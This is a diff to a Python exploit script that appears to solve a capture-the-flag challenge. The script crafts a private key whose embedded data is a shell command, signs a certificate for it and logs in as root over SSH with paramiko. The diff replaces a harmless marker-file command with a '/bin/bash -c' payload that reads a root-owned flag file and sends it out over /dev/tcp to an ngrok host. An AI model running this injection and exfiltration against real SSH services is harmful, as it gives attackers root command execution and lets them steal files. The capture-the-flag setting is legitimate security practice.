@@ -16,6 +16,9 @@ from cryptography.hazmat.primitives.serialization import (
 FLAG1 = 'SSM{based_0n_4_Tru3_St0ry}'
 INIT_HANDLE = 0x34868dbd
 
+HOST = 'localhost'
+PORT = 50000
+
 
 def create_chosen_key(command):
     cmd_cstr = f'{command}\0'
@@ -84,16 +87,17 @@ def convert_cert_to_openssh(private_key, signed_cert):
 
 
 def main():
-    private_key = create_chosen_key('echo "XYZ2" > /root/backdoor')
+    payload = '/bin/bash -c "cat /root/flag-part2.txt > /dev/tcp/0.tcp.eu.ngrok.io/11531"'
+    private_key = create_chosen_key(payload)
     signed_cert = create_certificate(private_key)
     openssh_key = convert_cert_to_openssh(private_key, signed_cert)
 
     sshclient = paramiko.SSHClient()
     sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    sshclient.connect(hostname='localhost',
+    sshclient.connect(hostname=HOST,
                       username='root',
                       pkey=openssh_key,
-                      port=3000)
+                      port=PORT)
 
 
 if __name__ == '__main__':
